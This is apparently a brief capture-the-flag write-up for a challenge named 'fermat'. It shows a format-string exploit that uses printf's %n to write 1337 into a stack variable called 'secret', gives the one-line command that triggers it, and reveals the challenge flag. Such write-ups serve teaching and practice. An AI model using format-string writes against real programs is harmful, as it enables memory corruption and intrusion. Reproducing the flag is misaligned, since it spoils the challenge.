Using printf's %n operator we can write a character 1337 times and get that number into the next variable on the stack, being `secret`.
we could do this like `./fermat "$(perl -e 'print "a"x1337')%n"`
flag: `flag_fermats_last_exploit`
